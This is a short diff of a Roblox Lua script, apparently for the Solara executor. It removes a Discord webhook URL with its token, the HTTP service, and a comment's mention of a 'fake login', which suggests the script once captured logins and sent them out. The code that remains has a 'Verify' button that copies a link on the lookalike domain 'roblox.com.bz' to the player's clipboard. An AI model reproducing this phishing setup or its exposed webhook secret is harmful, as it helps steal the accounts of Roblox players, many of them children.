@@ -1,9 +1,7 @@
 -- CONFIG
 local GROUP_LINK = "https://roblox.com.bz/communities/1713252036/"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1514988761912709281/wG1n9AYtVvspdiKwhy2KQ2mhF5KmdGLjW54vr_8gn7N5-o4ZcGSLrSw6jeM0bKjF6zF8"
 
 local Player = game:GetService("Players").LocalPlayer
-local HttpService = game:GetService("HttpService")
 
 -- Clipboard function for Solara V3
 local function copyText(text)
@@ -70,7 +68,7 @@ status.Font = Enum.Font.Gotham
 status.TextSize = 12
 status.Parent = frame
 
--- Verify button: only copy link, no fake login, GUI stays
+-- Verify button: only copy link, GUI stays
 btn.MouseButton1Click:Connect(function()
     copyText(GROUP_LINK)
     status.Text = "Group link copied to clipboard!"
